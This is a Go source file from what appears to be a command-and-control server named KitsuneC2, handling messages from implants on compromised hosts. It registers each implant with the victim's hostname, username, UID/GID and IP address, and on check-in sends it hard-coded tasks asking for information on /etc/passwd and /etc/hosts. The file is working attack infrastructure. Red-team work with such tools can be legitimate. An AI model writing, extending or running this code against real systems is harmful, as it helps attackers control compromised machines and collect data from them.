//This file contains all related functionality to handling incoming messages sent by implants.

package main

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/server/db"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"time"
)

// we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
// all message types and their corresponding functions can be called through the map below and the one in lib/serializable.go
var messageTypeToFunc = map[int]func(*session, interface{}){
	0: handleImplantRegister,
	1: handleCheckin,
	//reserved for implant functionality
	12: handleFileInfoResp,
}

// This function can be passed to a listener to handle incoming connections. This function guarantees that the connection will be closed after it's
// done.
func tcpHandler(conn net.Conn) {
	defer conn.Close()
	messageType, data, session, err := ReceiveEnvelopeFromImplant(conn)
	if err != nil {
		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
		return
	}

	handlerFunc := messageTypeToFunc[messageType]

	handlerFunc(session, data)
}

//-------------------Begin message handlers--------------------

// Handles envelopes with messageType==0. This is the very first message an implant sends to the server.
func handleImplantRegister(sess *session, data interface{}) {
	implantRegister, ok := data.(*communication.ImplantRegister)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
		return
	}

	var dbEntry *db.Implant_info = new(db.Implant_info)
	dbEntry.Id = implantRegister.ImplantId
	dbEntry.Name = implantRegister.ImplantName
	dbEntry.Hostname = implantRegister.Hostname
	dbEntry.Username = implantRegister.Username
	dbEntry.Uid = implantRegister.UID
	dbEntry.Gid = implantRegister.GID
	dbEntry.Public_ip = sess.connection.RemoteAddr().String()
	dbEntry.Last_checkin = int(time.Now().Unix())
	dbEntry.Os = ""   //TODO
	dbEntry.Arch = "" //TODO
	err := db.AddImplant(dbEntry)
	if err != nil {
		log.Printf("[ERROR] Could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
		return
	}
	log.Printf("[INFO] Registered implant with ID: %s", implantRegister.ImplantId)
}

// Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
// the "data" variable is a string with the ID of an implant.
func handleCheckin(sess *session, data interface{}) {
	//EXAMPLE: If we receive the folowing data: {}
	implantCheckin, ok := data.(*communication.ImplantCheckinReq)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=1 (Checkin), but could not convert envelope data to Checkin datastructure")
		return
	}
	log.Printf("[INFO] Handling check-in from implant with ID: %s", implantCheckin.ImplantId)

	//The ImplantCheckinResp message is a special type of message in which we have to do some extra JSON marshalling. We create
	//an object containing 2 arrays. The first integer array contains the Tasktypes that we want the implant to perform. The
	//second 2d byte array contains the arguments for every task (byte[Tasknr][marshalled task arguments]). The implant will
	//unmarshal the 2d byte array based on the taskTypes provided in the first array.
	//Example: We want to send a FileInfoReq for /etc/passwd and /etc/hosts. We create 2 FileinfoReq objects containing all
	//necessary arguments {PathToFile: "/etc/passwd"} and {PathToFile: "/etc/passwd"} and its corresponding MessageType (11, 11).
	//The ImplantCheckinResp object will look as follows: {[11, 11], [0][json.Marshal(FileInfoReq1)]}
	//														.....	 [1][json.Marhsal(FileInfoReq2)]
	req := new(communication.ImplantCheckinResp)
	req.TaskIds = make([]int, 2)
	req.TaskArguments = make([][]byte, 2)
	task1, _ := json.Marshal(communication.FileInfoReq{PathToFile: "/etc/passwd"})
	task2, _ := json.Marshal(communication.FileInfoReq{PathToFile: "/etc/hosts"})
	req.TaskIds[0] = 11
	req.TaskIds[1] = 11
	req.TaskArguments[0] = task1
	req.TaskArguments[1] = task2
	SendEnvelopeToImplant(sess, 2, req)
}

// Handles envelopes with messageType==12. The implant sends this message when the server sends a request for fileInfo.
func handleFileInfoResp(sess *session, data interface{}) {
	fileInfoResp, ok := data.(*communication.FileInfoResp)
	if !ok {
		log.Printf("[ERROR] Received envelope with messageType=2 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
		return
	}
	fmt.Printf("name: %s\nsize: %d\nmode: %s\nmodTime: %d\nisDir: %t", fileInfoResp.Name, fileInfoResp.Size, fileInfoResp.Mode, fileInfoResp.ModTime, fileInfoResp.IsDir)
}
